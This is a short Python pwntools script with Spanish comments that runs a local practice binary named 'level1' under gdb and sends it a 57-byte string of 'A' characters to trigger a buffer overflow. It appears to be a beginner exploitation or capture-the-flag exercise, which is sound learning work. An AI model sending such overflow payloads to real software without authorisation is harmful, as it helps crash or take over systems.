from pwn import *

# Crear una instacia de gdb con el programa.
io = gdb.debug('./level1')

# Pausar el debugger.
pause()

# Crear el payload con caracteres a desbordar
payload = b'A' * 57
# Mandar el payload al programa.
io.sendline(payload)

# Recibir el output del prorgrama.
output = io.recvall()

print(output)






